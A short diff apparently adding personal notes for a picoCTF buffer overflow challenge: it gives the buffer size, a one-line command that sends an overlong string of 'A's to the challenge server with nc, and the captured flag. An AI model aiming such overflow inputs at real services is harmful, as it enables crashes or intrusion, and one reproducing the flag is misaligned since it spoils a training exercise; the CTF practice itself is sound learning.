@@ -1,0 +1,6 @@
+the buffer size = 16 
+
+echo `python -c "print('A'*20)"`|nc saturn.picoctf.net 53935
+
+
+picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}
